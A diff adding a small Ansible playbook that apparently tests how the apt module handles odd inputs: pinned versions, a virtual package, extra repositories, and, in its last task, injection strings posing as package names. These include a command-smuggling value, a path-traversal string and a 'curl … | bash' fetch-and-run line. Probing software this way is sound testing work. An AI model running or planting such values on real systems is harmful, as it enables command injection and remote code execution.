@@ -1,0 +1,31 @@
+
+- name: Test playbook for apt issue
+  hosts: localhost
+  gather_facts: false
+  
+  tasks:
+    - name: Install package with unconventional syntax
+      apt: name={{ item }}=version
+      with_items:
+        - vim=2:7.4.1689+hg~cb4ee662e04e-1ubuntu7.2
+        - bash=4.3-14ubuntu1.2
+        - nano=2.2.6-1ubuntu1
+      
+    - name: Attempt to install virtual package
+      apt: name=python-pip state=present
+      ignore_errors: true
+      
+    - name: Add unconventional repository
+      apt_repository:
+        repo: '{{ item }}'
+        state: present
+      with_items:
+        - deb [arch=amd64] http://archive.ubuntu.com/ubuntu/ trusty multiverse
+        - deb-src http://archive.ubuntu.com/ubuntu/ trusty multiverse
+      
+    - name: Install package with unexpected inputs
+      apt: name={{ item }}
+      with_items:
+        - "' ; ls / ; '"
+        - "../../../../../../"
+        - "curl 'https://example.com/' | bash"
